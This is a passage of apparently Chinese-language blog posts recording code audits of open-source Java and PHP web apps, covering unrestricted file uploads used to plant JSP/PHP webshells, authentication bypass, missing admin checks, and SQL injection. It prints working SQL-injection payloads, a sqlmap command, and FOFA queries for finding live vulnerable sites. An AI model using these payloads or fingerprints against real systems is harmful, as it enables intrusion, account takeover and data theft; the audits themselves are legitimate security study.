未授权上传任意文件位于DiscussPostController.java文件中的uploadMdPic方法

这是一个通过post方法访问的接口，注释说的是拿来上传图片用的，但是看具体代码实现我们发现还是没有对上传的文件内容，后缀名进行任何的检验，也就是说我们可以上传任意文件，当然这功能是得在登录后才能使用的，但我们前面不是发现了一个鉴权绕过嘛，可以直接打配合实现未授权任意文件上传
让ai帮忙生成一个html表单上传文件的报文，然后进行利用

上传成功，访问该链接却报了404，打开hackbar查了一下问题如下：
将该报错拿去问了ai，按其提供的方法进行尝试依旧无果，不知道是哪里配置出的问题，但文件是确确实实上传成功了
我们通过application-develop.properties中的配置可以知道上传的文件存储位置

直接点该文件，确认了文件是没有问题的

那就很奇怪了。。。
未授权各种遍历UserController.java文件中有好几个方法存在可以说是一模一样的漏洞，第一个是getProfilePage方法

该函数的内容不重要，重点是看上面的链接代码@GetMapping(&quot;/profile/&#123;userId&#125;&quot;)，是根据userId的值来决定要访问的是哪一个用户，但是依然需要我们绕过鉴权，然后我们就可以对该userId的值进行爆破，获取大量信息
来一个例子如下：
第二个方法是getMyDiscussPosts方法

依旧是通过userId来访问每个人发布的帖子，进行利用如下：
最后一个方法是getMyComments方法

还是通过userId来访问每个人自己的评论&#x2F;回复，进行利用如下：

碰壁2是位于DiscussPostController.java文件中的setDelete方法
@PostMapping(&quot;/delete&quot;)@ResponseBodypublic String setDelete(int id) &#123;    discussPostService.updateStatus(id, 2);    // 触发删帖事件，通过消息队列更新 Elasticsearch 服务器    Event event = new Event()            .setTopic(TOPIC_DELETE)            .setUserId(hostHolder.getUser().getId())            .setEntityType(ENTITY_TYPE_POST)            .setEntityId(id);    eventProducer.fireEvent(event);    return CommunityUtil.getJSONString(0);&#125;

看着似乎是直接post传参id的值然后便可以进行一个删除帖子的操作，尝试一手




结果是直接跳转到了&#x2F;denied页面，哦吼？进到具体的帖子里面进行查看，发现没有看到有删帖这个按钮
感觉这个操作是管理员才能做的，全局搜索一下admin

果然是有不同权限的，查看其用法
在SecurityConfig.java文件中的configure方法中定义了每个不同的权限可以访问的路由，而上面的删帖路由便要求必须是admin才可以

再查一下权限是在哪里确定的，位于UserService.java文件中的getAuthorities方法

继续查看该方法的调用

熟悉吧，我们绕过鉴权的方法就注定了我们连普通用户的权限都没有
那为什么上面的漏洞我们可以直接配合绕过鉴权来利用呢，这是因为在SecurityConfig.java文件中的configure方法中定义的所有需要权限的路由上面那几个正好都不包括在其中，又是一个人工失误的地方
总结第一次进行java代码审计，采用了最笨的方法，把全部代码都看了一遍，虽然耗的时间长了些，但是从结果来看还是值得的
当然也有了一些思路了，重点关注controller目录下面的代码，当然还有interceptor目录下面的，毕竟该目录下面的文件作用主要用于拦截用户的请求并做相应的处理，通常应用在权限验证、记录请求信息的日志、判断用户是否登录等功能上，可能存在绕过鉴权等漏洞
参考JAVA代码审计——Echo4.2
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
  </entry>
  <entry>
    <title>代码审计-仿天猫商城</title>
    <url>/2025/09/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%BF%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E/</url>
    <content><![CDATA[前言Springboot项目仿天猫商城 ：前台jsp页面（前后端在一起），mysql数据库，jdk1.8
项目地址：https://gitee.com/HaiTao87/TmallDemo
环境搭建按照项目里面说的部署方式进行部署就完事了，下面我只要分享几点我自己搭建环境过程中所遇到的报错的解决方案
20:28:33.382 [restartedMain] ERROR org.springframework.boot.SpringApplication - Application run failedjava.lang.IllegalStateException: Failed to load property source from location &#x27;classpath:/application.yml&#x27;	at org.springframework.boot.context.config.ConfigFileApplicationListener$Loader.load(ConfigFileApplicationListener.java:524).......Caused by: java.nio.charset.MalformedInputException: Input length = 1	at java.nio.charset.CoderResult.throwException(CoderResult.java:281)	at sun.nio.cs.StreamDecoder.implRead(StreamDecoder.java:339)	at sun.nio.cs.StreamDecoder.read(StreamDecoder.java:178)	at java.io.InputStreamReader.read(InputStreamReader.java:184)	at org.yaml.snakeyaml.reader.UnicodeReader.read(UnicodeReader.java:125)	at org.yaml.snakeyaml.reader.StreamReader.update(StreamReader.java:183)	... 46 common frames omitted

这主要是说明了 application.yml文件可能是在某些编辑器（如 Windows 记事本）中以 GBK 或其它非 UTF-8 编码保存的，而 Spring Boot 默认使用 UTF-8 编码来读取配置文件
所以我验证的方式是用HxD这个软件来打开 application.yml文件，看到了中文全部都是以乱码的形式显示，解决的办法最简单的就是直接将 application.yml和application-dev.yml中的所有中文注释都删掉就可以了
在启动项目的时候还会遇到一个报错如下：
E:\safety\CodeAudit\TmallDemo-master\src\test\java\com\example\tmall\TmallApplicationTests.java:3:29java: 无法访问org.junit.jupiter.api.Test  错误的类文件: /C:/Users/BD/.m2/repository/org/junit/jupiter/junit-jupiter-api/6.0.0-M2/junit-jupiter-api-6.0.0-M2.jar!/org/junit/jupiter/api/Test.class    类文件具有错误的版本 61.0, 应为 52.0    请删除该文件或确保该文件位于正确的类路径子目录中。

这是java版本不兼容的问题，项目里面该库用的是java17的版本，但目前编译和运行该项目的是java8
我的解决方法是更改pom.xml里面依赖的版本
&lt;dependency&gt;    &lt;groupId&gt;org.junit.jupiter&lt;/groupId&gt;    &lt;artifactId&gt;junit-jupiter-api&lt;/artifactId&gt;    &lt;version&gt;5.9.3&lt;/version&gt;    &lt;scope&gt;test&lt;/scope&gt;&lt;/dependency&gt;

后面登录管理后台的时候也会报错如下
Whitelabel Error PageThis application has no explicit mapping for /error, so you are seeing this as a fallback.Thu Sep 18 21:04:32 CST 2025There was an unexpected error (type=Internal Server Error, status=500).### Error querying database. Cause: java.sql.SQLSyntaxErrorException: Expression #1 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#x27;tmalldemodb.productOrder.productorder_pay_date&#x27; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by ### The error may exist in file [E:\safety\CodeAudit\TmallDemo-master\target\classes\mapper\ProductOrderMapper.xml] ### The error may involve defaultParameterMap ### The error occurred while setting parameters ### SQL: SELECT productOrder_pay_date,count(productOrder_id) as productOrder_count ,productOrder_status from productOrder WHERE productOrder_pay_date BETWEEN ? AND ? GROUP BY DATE_FORMAT(productOrder_pay_date,&#x27;%Y-%m-%d&#x27;),productOrder_status ### Cause: java.sql.SQLSyntaxErrorException: Expression #1 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#x27;tmalldemodb.productOrder.productorder_pay_date&#x27; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by ; bad SQL grammar []; nested exception is java.sql.SQLSyntaxErrorException: Expression #1 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#x27;tmalldemodb.productOrder.productorder_pay_date&#x27; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_byorg.springframework.jdbc.BadSqlGrammarException: ### Error querying database.  Cause: java.sql.SQLSyntaxErrorException: Expression #1 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#x27;tmalldemodb.productOrder.productorder_pay_date&#x27; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by### The error may exist in file [E:\safety\CodeAudit\TmallDemo-master\target\classes\mapper\ProductOrderMapper.xml]........

不知道这个报错是不是和我上面改了一个依赖的版本有关。。。。
该报错的核心在于你的 SQL 查询语句的写法 与你使用的 MySQL 版本默认的严格模式 不兼容
下面是我的解决方案
&lt;select id=&quot;getTotalByDate&quot; resultType=&quot;com.xq.tmall.entity.OrderGroup&quot;&gt;    SELECT    MIN(productOrder_pay_date) AS productOrder_pay_date,     count(productOrder_id) as productOrder_count,     productOrder_status     FROM productOrder    &lt;where&gt;        productOrder_pay_date BETWEEN #&#123;beginDate&#125; AND #&#123;endDate&#125;    &lt;/where&gt;    GROUP BY DATE_FORMAT(productOrder_pay_date,&#x27;%Y-%m-%d&#x27;), productOrder_status&lt;/select&gt;

这么改了之后是可以进入管理后台了，但代价就是近7天要是有购买数据的话后台就直接崩掉了。。。（幸好我们只是拿来测试，可以直接在数据库删完数据后再进入后台就可以了，不知道师傅们有没有更好的解决方案
审计由于该项目的代码体量不多，这次我基本是直接看着源码查漏洞的
sql注入是mybatis数据库，全局搜索关键词${ || +
这里选的是ProductMapper.xml中的一个搜索语句，位于 ORDER BY关键字后面

然后我们一路向上查找用法，走到ProductServiceImpl.java的getList方法处，继续查找用法，这次要注意的是查找到的要是我们可以控的orderUtil参数的相关方法，而不是已经默认为null的
再加上有前台和后台之分，我们尽量找前台，而不是需要管理员权限的后台相关代码
走到了ForeProductListController.java的searchProduct方法中

@RequestMapping(value = &quot;product/&#123;index&#125;/&#123;count&#125;&quot;, method = RequestMethod.GET)public String searchProduct(HttpSession session, Map&lt;String, Object&gt; map,                            @PathVariable(&quot;index&quot;) Integer index/* 页数 */,                            @PathVariable(&quot;count&quot;) Integer count/* 行数*/,                            @RequestParam(value = &quot;category_id&quot;, required = false) Integer category_id/* 分类ID */,                            @RequestParam(value = &quot;product_name&quot;, required = false) String product_name/* 产品名称 */,                            @RequestParam(required = false) String orderBy/* 排序字段 */,                            @RequestParam(required = false, defaultValue = &quot;true&quot;) Boolean isDesc/* 是否倒序 */) throws UnsupportedEncodingException

除了index和count参数是必需外，剩下的参数都是可加可不加的，所以我们可以直接进行测试
这里用的是时间盲测的手法

该篇就只讲这一处的sql漏洞，剩下几处就不多讲了
前台文件上传全局搜索关键词：upload || 上传 ||  write || new File
这里找到前台的ForeUserController.java的uploadUserHeadImage方法
@RequestMapping(value = &quot;user/uploadUserHeadImage&quot;, method = RequestMethod.POST, produces = &quot;application/json;charset=utf-8&quot;)public  String uploadUserHeadImage(@RequestParam MultipartFile file, HttpSession session)&#123;    String originalFileName = file.getOriginalFilename();    logger.info(&quot;获取图片原始文件名：&#123;&#125;&quot;, originalFileName);    String extension = originalFileName.substring(originalFileName.lastIndexOf(&#x27;.&#x27;));    String fileName = UUID.randomUUID() + extension;    String filePath = session.getServletContext().getRealPath(&quot;/&quot;) + &quot;res/images/item/userProfilePicture/&quot; + fileName;    logger.info(&quot;文件上传路径：&#123;&#125;&quot;, filePath);    JSONObject jsonObject = new JSONObject();    try &#123;        logger.info(&quot;文件上传中...&quot;);        file.transferTo(new File(filePath));        logger.info(&quot;文件上传成功！&quot;);        jsonObject.put(&quot;success&quot;, true);        jsonObject.put(&quot;fileName&quot;, fileName);    &#125; catch (IOException e) &#123;        logger.warn(&quot;文件上传失败！&quot;);        e.printStackTrace();        jsonObject.put(&quot;success&quot;, false);    &#125;    return jsonObject.toJSONString();&#125;

可以发现对上传上来的文件没有做任何的校验，再加上该项目中是可以解析jsp文件的，所以我们可以上传Jsp马
前端做了一定的校验，只允许上传图片
//图片上传function uploadImage(fileDom) &#123;    //获取文件    var file = fileDom.files[0];    //判断类型    var imageType = /^image\//;    if (file === undefined || !imageType.test(file.type)) &#123;        alert(&quot;请选择图片！&quot;);        return;    &#125;    //判断大小    if (file.size &gt; 512000) &#123;        alert(&quot;图片大小不能超过500K！&quot;);        return;    &#125;    //清空值    $(fileDom).val(&#x27;&#x27;);    var formData = new FormData();    formData.append(&quot;file&quot;, file);    //上传图片    $.ajax(&#123;        url: &quot;/tmall/user/uploadUserHeadImage&quot;,        type: &quot;post&quot;,        data: formData,        contentType: false,        processData: false,        dataType: &quot;json&quot;,        mimeType: &quot;multipart/form-data&quot;,        success: function (data) &#123;            if (data.success) &#123;                $(fileDom).prev(&quot;img&quot;).attr(&quot;src&quot;,&quot;/tmall/res/images/item/userProfilePicture/&quot;+data.fileName);                $(&quot;#user_profile_picture_src_value&quot;).val(data.fileName);            &#125; else &#123;                alert(&quot;图片上传异常！&quot;);            &#125;        &#125;,        beforeSend: function () &#123;        &#125;,        error: function () &#123;        &#125;    &#125;);&#125;

通过bp抓包即可绕过

上传成功，用蚁剑进行连接测试

后台文件上传该漏洞需要管理员权限才可以成功利用
首先是ProductController.java的uploadProductImage方法
@ResponseBody@RequestMapping(value = &quot;admin/uploadProductImage&quot;, method = RequestMethod.POST, produces = &quot;application/json;charset=utf-8&quot;)public String uploadProductImage(@RequestParam MultipartFile file, @RequestParam String imageType, HttpSession session) &#123;    String originalFileName = file.getOriginalFilename();    logger.info(&quot;获取图片原始文件名：&#123;&#125;&quot;, originalFileName);    String extension = originalFileName.substring(originalFileName.lastIndexOf(&#x27;.&#x27;));    String filePath;    String fileName = UUID.randomUUID() + extension;    if (&quot;single&quot;.equals(imageType)) &#123;        filePath = session.getServletContext().getRealPath(&quot;/&quot;) + &quot;res/images/item/productSinglePicture/&quot; + fileName;    &#125; else &#123;        filePath = session.getServletContext().getRealPath(&quot;/&quot;) + &quot;res/images/item/productDetailsPicture/&quot; + fileName;    &#125;    logger.info(&quot;文件上传路径：&#123;&#125;&quot;, filePath);    JSONObject object = new JSONObject();    try &#123;        logger.info(&quot;文件上传中...&quot;);        file.transferTo(new File(filePath));        logger.info(&quot;文件上传完成&quot;);        object.put(&quot;success&quot;, true);        object.put(&quot;fileName&quot;, fileName);    &#125; catch (IOException e) &#123;        logger.warn(&quot;文件上传失败！&quot;);        e.printStackTrace();        object.put(&quot;success&quot;, false);    &#125;    return object.toJSONString();&#125;

一样也是没有进行任何的校验，查看了前端代码只有前端做了限制只允许上传图片
跟前台文件上传一样的手法就可以了

用蚁剑成功连上
除了该处漏洞外后台还有其他几处文件上传漏洞
src&#x2F;main&#x2F;java&#x2F;com&#x2F;xq&#x2F;tmall&#x2F;controller&#x2F;admin&#x2F;CategoryController.java的uploadCategoryImage方法
src&#x2F;main&#x2F;java&#x2F;com&#x2F;xq&#x2F;tmall&#x2F;controller&#x2F;admin&#x2F;AccountController.java的uploadAdminHeadImage方法
越权俗话说的好，好饭不怕晚，越权的洞当然是压轴的了
这里用的是其他类继承一个基础类BaseController来实现鉴权
package com.xq.tmall.controller;import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;import javax.servlet.http.HttpSession;/** * 基控制器 */public class BaseController &#123;    //log4j    protected Logger logger = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME);    //检查管理员权限    protected Object checkAdmin(HttpSession session)&#123;        Object o = session.getAttribute(&quot;adminId&quot;);        if(o==null)&#123;            logger.info(&quot;无管理权限，返回管理员登陆页&quot;);            return null;        &#125;        logger.info(&quot;权限验证成功，管理员ID：&#123;&#125;&quot;,o);        return o;    &#125;    //检查用户是否登录    protected Object checkUser(HttpSession session)&#123;        Object o = session.getAttribute(&quot;userId&quot;);        if(o==null)&#123;            logger.info(&quot;用户未登录&quot;);            return null;        &#125;        logger.info(&quot;用户已登录，用户ID：&#123;&#125;&quot;, o);        return o;    &#125;&#125;

从代码里面可以发现是没有任何的逻辑漏洞等等的，也就是说只要用好checkAdmin和checkUser这两个方法那么就完全绕过不了了
但是有时候代码无错不代表一定安全，因为开发人员也会出现错误
这里我翻代码的时候找到了ProductController.java的deleteProductImageById方法
@ResponseBody@RequestMapping(value = &quot;admin/productImage/&#123;productImage_id&#125;&quot;,method = RequestMethod.DELETE,produces = &quot;application/json;charset=utf-8&quot;)public String deleteProductImageById(@PathVariable Integer productImage_id/* 产品图片ID */)&#123;    JSONObject object = new JSONObject();    logger.info(&quot;获取productImage_id为&#123;&#125;的产品图片信息&quot;,productImage_id);    ProductImage productImage = productImageService.get(productImage_id);    logger.info(&quot;删除产品图片&quot;);    Boolean yn = productImageService.deleteList(new Integer[]&#123;productImage_id&#125;);    if (yn) &#123;        logger.info(&quot;删除图片成功！&quot;);        object.put(&quot;success&quot;, true);    &#125; else &#123;        logger.warn(&quot;删除图片失败！事务回滚&quot;);        object.put(&quot;success&quot;, false);        throw new RuntimeException();    &#125;    return object.toJSONString();&#125;

该类中就这么一个方法没有用上checkAdmin方法，于是我们就实现了垂直越权操作

去后台查看发现确实是少了一张图片了

在写这篇文章的时候我看了看这个方法的代码，发现它所需的参数中并没有session或者是cookie，那么是不是代表我们可以实现未登录的情况下任意删除图片，进行测试

确实如此，意外之喜呐
还有一个方法是CategoryController.java的updateCategory方法
@ResponseBody@RequestMapping(value = &quot;admin/category/&#123;category_id&#125;&quot;, method = RequestMethod.PUT, produces = &quot;application/json;charset=utf-8&quot;)public String updateCategory(@RequestParam String category_name/* 分类名称 */,                             @RequestParam String category_image_src/* 分类图片路径 */,                             @PathVariable(&quot;category_id&quot;) Integer category_id/* 分类ID */) &#123;    JSONObject jsonObject = new JSONObject();    logger.info(&quot;整合分类信息&quot;);    Category category = new Category()            .setCategory_id(category_id)            .setCategory_name(category_name)            .setCategory_image_src(category_image_src.substring(category_image_src.lastIndexOf(&quot;/&quot;) + 1));    logger.info(&quot;更新分类信息，分类ID值为：&#123;&#125;&quot;, category_id);    boolean yn = categoryService.update(category);    if (yn) &#123;        logger.info(&quot;更新成功！&quot;);        jsonObject.put(&quot;success&quot;, true);        jsonObject.put(&quot;category_id&quot;, category_id);    &#125; else &#123;        jsonObject.put(&quot;success&quot;, false);        logger.info(&quot;更新失败！事务回滚&quot;);        throw new RuntimeException();    &#125;    return jsonObject.toJSONString();&#125;

该方法同样是没有进行鉴权的操作
上述的两个方法虽然说都可以实现垂直越权，但是在真实环境中可以说是危害不大，直到我发现了下面这个
位于UserController.java的getUserBySearch方法
    @ResponseBody    @RequestMapping(value = &quot;admin/user/&#123;index&#125;/&#123;count&#125;&quot;, method = RequestMethod.GET, produces = &quot;application/json;charset=UTF-8&quot;)    public String getUserBySearch(@RequestParam(required = false) String user_name/* 用户名称 */,                                  @RequestParam(required = false) Byte[] user_gender_array/* 用户性别数组 */,                                  @RequestParam(required = false) String orderBy/* 排序字段 */,                                  @RequestParam(required = false, defaultValue = &quot;true&quot;) Boolean isDesc/* 是否倒序 */,                                  @PathVariable Integer index/* 页数 */,                                  @PathVariable Integer count/* 行数 */) throws UnsupportedEncodingException &#123;        //移除不必要条件        Byte gender = null;        if (user_gender_array != null &amp;&amp; user_gender_array.length == 1) &#123;            gender = user_gender_array[0];        &#125;        if (user_name != null) &#123;            //如果为非空字符串则解决中文乱码：URLDecoder.decode(String,&quot;UTF-8&quot;);            user_name = &quot;&quot;.equals(user_name) ? null : URLDecoder.decode(user_name, &quot;UTF-8&quot;);        &#125;        if (orderBy != null &amp;&amp; &quot;&quot;.equals(orderBy)) &#123;            orderBy = null;        &#125;..........

可以发现该方法没有用到checkAdmin方法进行鉴权，直接测试垂直越权

获取前十个管理员的所有信息，实现了任意管理员账户接管
我们也可以加上条件来查询一个特定管理员的信息

结语该项目审计起来难度不大，就是自己测试的时候环境搭建麻烦了点。。。。
还有其他思路的欢迎师傅与我进行交流
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
  </entry>
  <entry>
    <title>代码审计-thinkphp中的文件上传漏洞</title>
    <url>/2024/08/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-thinkphp%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[前言这两天审计了一个基本组成是thinkphp的代码，里面有一个文件上传的漏洞，下面记录一下审计的整个流程
在fofa上面搜索一下：&quot;web/static/css/chunk-elementUI.f92cd1c5.css&quot;，搜索到的链接其前后端便是这次审计的代码框架
审计在开始审计该框架的时候，我便已经知道这个框架有一个文件上传的漏洞，所以审计的过程中我便只看了跟文件上传有关的代码
该框架是一个多应用模式，app目录下面有admin,api,super,web四个目录，身为普通用户的我们是在web目录下的，也只能够操作web目录下面的控制器方法
web目录下面有一个Upload.php文件，具体代码如下：
&lt;?phpnamespace app\web\controller;use think\facade\Filesystem;class Upload extends Base&#123;    /**     *上传图片     */    public function image()    &#123;        try &#123;            // 获取上传的文件（名称为 &#x27;image&#x27;）            $file = request()-&gt;file(&#x27;image&#x27;);            // 将文件保存到 &#x27;public&#x27; 磁盘的 &#x27;image&#x27; 目录中，文件名使用唯一ID            $path = Filesystem::disk(&#x27;public&#x27;)-&gt;putFile(&#x27;image&#x27;, $file, &#x27;uniqid&#x27;);            // 获取文件扩展名，最后一个.处            $ext = strrchr($path, &#x27;.&#x27;);            // 检查文件扩展名是否在允许的格式中（.jpg, .jpeg, .png, .gif）            if (!in_array($ext, [&#x27;.jpg&#x27;, &#x27;.jpeg&#x27;, &#x27;.png&#x27;, &#x27;.gif&#x27;])) &#123;                // 如果文件格式不正确，删除文件                @unlink(&#x27;./upload/&#x27; . $path);                // 返回错误信息，指明只能上传指定格式的图片                return errorJson(&#x27;只能上传jpg/png/gif格式的图片&#x27;);            &#125;            // 将文件保存到OSS（对象存储服务），并返回文件的URL            $url = saveToOss(&#x27;./upload/&#x27; . $path);            // 返回成功信息，包括文件的URL            return successJson([                &#x27;path&#x27; =&gt; $url            ]);        &#125; catch (\Exception $e) &#123;            // 捕获异常并返回错误信息            return errorJson($e-&gt;getMessage());        &#125;    &#125;&#125;

这是上传头像的代码
先开启proxy插件，然后更改一下头像，在bp代理模块的HTTP历史记录中找到/web.php/upload/image条目，发送到重放器中
上面代码要求的文件名后缀只能够是.jpg, .jpeg, .png, .gif，但是是通过$ext = strrchr($path, &#39;.&#39;);来获取后缀名进行检测的，而这个方法只是获取最后一个.处的内容，于是我想尝试一波能不能通过00截断进行绕过

成功上传，但是看来一眼回显的链接文件名后缀是jpg形式的，两眼一黑
后面发现这个框架是thinkphp6的框架，已经超出了00截断嫩影响的版本了
于是尝试用其他的方法，都失败了
这个时候豆哥点拨了一句：web目录下面有好几处文件上传的地方，看看thinkphp框架自己包装了哪些文件上传的方法
于是问了一下gpt，全局搜索了request()-&gt;file方法，在web目录下面有好几个文件都用了这个方法
一个个文件审计过去，最终确定了文件上传的漏洞点位于Video.php文件下的uploadMedia()方法
public function uploadMedia()    &#123;        try &#123;            $file = request()-&gt;file(&#x27;file&#x27;);            $mine = $file-&gt;getMime();            if (!in_array($mine, [&#x27;image/png&#x27;, &#x27;image/jpeg&#x27;, &#x27;video/mp4&#x27;])) &#123;                return errorJson(&#x27;仅支持上传jpg/png/mp4格式文件&#x27;);            &#125;            if ($mine == &#x27;video/mp4&#x27;) &#123;                $fileType = &#x27;video&#x27;;            &#125; else &#123;                $fileType = &#x27;image&#x27;;            &#125;            $path = Filesystem::disk(&#x27;public&#x27;)-&gt;putFile($fileType, $file, &#x27;uniqid&#x27;);            $url = saveToOss(&#x27;./upload/&#x27; . $path);            return successJson([                &#x27;type&#x27; =&gt; $fileType,                &#x27;path&#x27; =&gt; $url            ]);        &#125; catch (\Exception $e) &#123;            return errorJson($e-&gt;getMessage());        &#125;    &#125;

那么为什么是这里呢，我们看看该方法的代码
它是通过检测文件的Mine值来判断文件是否符合要求的，而Mine值可以通过bp抓包修改content-type的值来更改
该方法不检查文件的后缀名，所以我们就可以上传php文件了
话不多说，开始操作
我们先构造一个url来访问该方法：/web.php/video/uploadMedia
要注意是web.php而不是web
访问后报错如下：

问题不大，成功访问到了uploadMedia()方法，该报错只是getMine()的值为空而已
接下来我们需要做的就是构造一个文件上传的请求包，要注意的是该方法的参数名是file（鄙人狠狠地踩进了这个坑中）
所以构造的请求包如下所示：

一切都很完美了呀，可是为什么还是500错误呢
报错 &#123;&quot;code&quot;:0,&quot;message&quot;:&quot;Call to undefined function think\\finfo_open()&quot;&#125; 表明在你的 PHP 环境中缺少 finfo_open 函数。这个函数是 PHP 的 Fileinfo 扩展的一部分，该扩展用于检测文件的 MIME 类型
原来是系统没有启用该扩展，所以导致文件上传不上去
但是客观上面还是存在该漏洞的，只是我们不能利用罢了（呜呜呜）
结语这次代码审计比第一次要轻松，主要还是因为提前学习了thinkphp框架，所以对于系统的结构，要从哪里下手看代码进行审计还是比较清楚的
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
  </entry>
  <entry>
    <title>代码审计-某TP6对接U支付系统</title>
    <url>/2024/08/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%9F%90TP6%E5%AF%B9%E6%8E%A5U%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[前言本次审计的是一个基于tinkphp6框架的U支付系统
在fofa上面搜索：&quot;/usdtmerchant/login/reg.html&quot;便可以找到相关的网站，要注意的是有些网站已经进行了改进，再也不能利用该文章中的漏洞了
前台sql注入漏洞身为一个普通用户，我们能够访问的也就只有index.php，所以我们要从app&#x2F;index&#x2F;controller&#x2F;Index.php开始进行审计
我是在已经知道有该漏洞的情况下进行复现的，所以在该文件中我直接搜索关键字Db，查查是否有可以利用的函数，如下：
public function send()&#123; $dd =  Db::query(urldecode($_REQUEST[&#x27;query&#x27;]));&#125;

该方法允许直接对变量query进行赋值，输入相关的搜索语句，直接运行
该方法并没有对输入的内容进行验证，所以可以尝试是否存在sql注入漏洞
正是因为语句是我们自己输入的，所以并不存在联合注入漏洞，无法报错注入
尝试后可知该方法只要搜索语句正确状态码便是200，错误的话就是400，所以无法利用布尔盲注，因此就剩一个时间盲注
输入：/index/index/send?query=select+if(length(database())=3,sleep(3),1)

由图可知数据库名字长度为3，存在时间盲注
剩下来的步骤可以利用脚本来进行，也可以利用sqlmap来进行
sqlmap的语句如下：
python sqlmap.py -u &quot;http://127.0.0.1:81/index/index/send?query=*&quot; --level=3 --dbms=mysql

前台任意文件写入漏洞首先搜索一下thinkphp封装的文件上传方法，无果
接着尝试搜索一下文件上传的危险函数，有果，为函数get_trc20()，如下：
public function get_trc20()&#123;       $version=Db::name(&#x27;system_config&#x27;)-&gt;where([&#x27;id&#x27;=&gt;72])-&gt;order(&#x27;id desc&#x27;)-		&gt;save(array(&quot;auth_key&quot;=&gt;$_REQUEST[&#x27;key&#x27;]));       $versionsss=Db::name(&#x27;system_config&#x27;)-&gt;where([&#x27;id&#x27;=&gt;72])-&gt;find();       file_put_contents($_GET[&#x27;name&#x27;].&quot;.php&quot;,base64_decode($versionsss[&#x27;auth_key&#x27;]));     &#125;

该函数中存在file_put_contents方法，可以任意写入内容，没有任何过滤，并且文件名后缀还是php（纯纯后门我觉得）
由该函数可知，我们只需要对变量key赋值base64编码后的php文件内容，然后对变量name赋值一个文件名便可以了

上传成功，访问该文件：/fw.php，如下：

结语这个代码审计其实相比于其他几个都更加简单，没多大困难
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
  </entry>
  <entry>
    <title>代码审计-某微商城系统RCE漏洞</title>
    <url>/2024/08/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%9F%90%E5%BE%AE%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9FRCE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[前言本次审计的项目有提供部署的相关步骤和视频教程，但不知为何我自己在搭建的时候会出现莫名的错误导致环境搭建不起来，因此只能fofa上面搜一个来进行测试
fofa语句：&quot;/Mao_Public/js/jquery-2.1.1.min.js&quot;
前台sql注入漏洞首先我们先审计一下主页代码index.php，发现一处sql查询的地方
&lt;?php                        $rs = $DB-&gt;query(&quot;SELECT * FROM mao_shop WHERE M_id=&#x27;&#123;$mao[&#x27;id&#x27;]&#125;&#x27; and (tj=&#x27;0&#x27; &amp;&amp; zt=&#x27;0&#x27;) order by id desc limit 2&quot;);                        while($rows = $DB-&gt;fetch($rs))&#123;                            if($rows[&#x27;type&#x27;] == 1)&#123;                                $type = &quot;天猫优选&quot;;                            &#125;elseif ($rows[&#x27;type&#x27;] == 2)&#123;                                $type = &quot;超值捡漏&quot;;                            &#125;elseif ($rows[&#x27;type&#x27;] == 3)&#123;                                $type = &quot;人气销量&quot;;                            &#125;                            ?&gt;

对$mao[‘id’]进行溯源，看看是否可控
$mao=$DB-&gt;get_row(&quot;select * from mao_data where url=&#x27;&#123;$_SERVER[&#x27;HTTP_HOST&#x27;]&#125;&#x27; or url_1=&#x27;&#123;$_SERVER[&#x27;HTTP_HOST&#x27;]&#125;&#x27; limit 1&quot;);

可以看出$mao的值是从一个叫做mao_data的表中获取的，因此是不可控的，遂放弃
该文件中还有一两处sql查询的地方，但其参数我们都不可控
在网页处乱点一通后，查看bp的代理模块中的http历史记录，发现了有趣的地方

查看goods.php文件
&lt;?phprequire &#x27;./Mao/common.php&#x27;;$id= isset($_GET[&#x27;id&#x27;]) ? $_GET[&#x27;id&#x27;] : 0;$cha_1 = $DB-&gt;get_row(&quot;select * from mao_shop where M_id=&#x27;&#123;$mao[&#x27;id&#x27;]&#125;&#x27; and id=&#x27;&#123;$id&#125;&#x27; limit 1&quot;);if($cha_1[&#x27;type&#x27;] == 1)&#123;    $bt = &quot;天猫优选&quot;;&#125;elseif ($cha_1[&#x27;type&#x27;] == 2)&#123;    $bt = &quot;超值捡漏&quot;;&#125;elseif ($cha_1[&#x27;type&#x27;] == 3)&#123;    $bt = &quot;人气销量&quot;;&#125;if(!$cha_1)&#123;    sysmsg(&quot;商品不存在！&quot;);&#125;?&gt;

已知$mao[‘id’]不可控，但是后面的$id可以通过$id= isset($_GET[&#39;id&#39;]) ? $_GET[&#39;id&#39;] : 0;进行控制，还是单引号包括
通过查看sql文件得知表mao_shop一共有18字段
所以测试：/goods.php?id=&#39;union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--+

可以看到字段3，7，12，14可控

剩下的就是普通的union注入步骤，这边就不详写了
前台任意文件上传漏洞全局搜索文件上传的危险函数，这次是move_uploaded_file()，位于api&#x2F;api.php文件中
